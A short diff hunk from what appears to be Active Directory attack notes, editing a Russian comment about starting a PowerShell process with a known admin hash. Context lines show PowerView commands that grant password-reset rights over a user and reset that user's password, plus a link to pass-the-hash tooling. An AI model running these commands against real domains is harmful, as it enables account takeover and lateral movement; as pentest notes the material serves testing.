@@ -133,7 +133,7 @@ Add-DomainObjectAcl -TargetIdentity Herman -PrincipalIdentity nico -Rights Reset
 $passwd = ConvertTo-SecureString 'Password123' -AsPlainText -Force
 Set-DomainUserPassword Herman -AccountPassword $passwd -Verbose
 
-# Запуск процесса зная хеш админа!!!!
+# Запуск процесса powershell frm powershell зная хеш админа!!!!
 
 https://github.com/Kevin-Robertson/Invoke-TheHash
 
